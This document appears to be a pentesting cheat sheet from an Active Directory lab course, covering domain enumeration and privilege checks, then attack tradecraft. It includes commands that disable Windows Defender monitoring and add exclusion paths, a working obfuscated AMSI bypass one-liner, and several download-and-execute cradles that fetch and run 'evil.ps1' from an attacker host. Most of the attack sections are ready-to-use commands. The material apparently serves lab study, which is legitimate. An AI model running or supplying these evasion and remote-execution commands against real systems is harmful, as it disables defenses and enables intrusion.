# Domain Controller - Basic Information & Privilege Checking

**Important Note:**  
Please remember to turn off or add an exception to your VM's firewall when running a listener for a reverse shell.

### FQDN and Privilege Checking:

To check the Fully Qualified Domain Name (FQDN) and privilege settings, you can use the following PowerShell commands:

```powershell
PS C:\Users\student157> [System.Net.Dns]::GetHostByName(($env:computerName))  # FQDN
net localgroup administrators /domain
cmd /c "hostname & whoami & ipconfig & net localgroup administrators"
cmd /c "hostname & whoami & ipconfig & Whoami /priv"
```

To check privileges:

```powershell
PS C:\Users\student157> whoami /priv
```

**Sample Output:**

```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Hostname and Network Configuration:

```powershell
PS C:\Users\student157> hostname
PS C:\Users\student157> ipconfig
```

---

# Native Executables and .NET Classes

You can retrieve information about the current domain using the .NET classes as follows:

```powershell
PS C:\Users\student157> $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
PS C:\Users\student157> $ADClass::GetCurrentDomain()
```

**Sample Output:**

```
Forest                          : moneycorp.local
DomainControllers                : {dcorp-dc.dollarcorp.moneycorp.local}
Children                         : {us.dollarcorp.moneycorp.local}
DomainMode                       : Unknown
DomainModeLevel                 : 7  # Function level of the current domain (Windows Server 2016)
Parent                           : moneycorp.local
PdcRoleOwner                     : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner                     : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner          : dcorp-dc.dollarcorp.moneycorp.local
Name                             : dollarcorp.moneycorp.local  # Current child domain
```

---

# Command Execution and Help System

PowerShell provides various methods for getting help with commands and modules. You can use the following to explore the available help system:

```powershell
# Get help for Get-NetGroup command
get-help Get-NetGroup

# Get examples for Get-NetGroup
get-help Get-NetGroup -examples

# Get detailed help
get-help Get-NetGroup -full
get-help Get-NetGroup -detailed

# Show the command details
show-command Get-NetGroup

# Update help system
Update-Help
```

**Sample Output for `get-help Get-NetGroup`:**

```powershell
SYNTAX
    Get-NetGroup [[-GroupName] <String>] [[-SID] <String>] [[-UserName] <String>] [[-Filter] <String>] [[-Domain] <String>]
    [[-DomainController] <String>] [[-ADSpath] <String>] [-AdminCount] [-FullData] [-RawSids] [-AllTypes] [[-PageSize]
    <Int32>] [[-Credential] <PSCredential>] [<CommonParameters>]
```

---

# ExclusionPath and Bypass AMSI

To disable real-time monitoring or bypass AMSI (Antimalware Scan Interface), you can use the following techniques:

```powershell
# Disable Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Bypass Execution Policy
powershell -ep bypass

# Add Exclusion Path
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\AD'"

# Example script execution bypass
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference = "bypass"
```

**AMS bypass example using a variable:**

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U"" +""zX"" ) -VaL ).""A`ss`Embly"".""GET`TY`Pe""(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).""g`etf`iElD""( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' )).""sE`T`VaLUE""( ${n`ULl},${t`RuE} )
```

---

# PowerShell Module

To import and use modules in PowerShell, you can use the following:

```powershell
# Import a module
Import-Module <module_path>  # (.dll or .psd1 file)

# List all commands in a module
Get-Command -Module <modulename>
```

**Example:**

```powershell
PS C:\AD\Tools\ADModule-master\ADModule-master> Import-Module .\Microsoft.ActiveDirectory.Management.dll
PS C:\AD\Tools\ADModule-master\ADModule-master> Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

---

# Download and Execute Scripts

To download and execute PowerShell scripts from the internet, use the following methods:

```powershell
# Download and execute using IEX
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

# Using Internet Explorer COM Object
$ie = New-Object -ComObject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response = $ie.Document.body.innerHTML
$ie.quit()
iex $response

# Using PowerShell V3 and later
iex (iwr 'http://192.168.230.1/evil.ps1')

# Using MSXML2.XMLHTTP COM Object
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://192.168.230.1/evil.ps1',$false)
$h.send()
iex $h.responseText

# Using WebRequest
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader] ($r.GetResponseStream())).ReadToEnd()
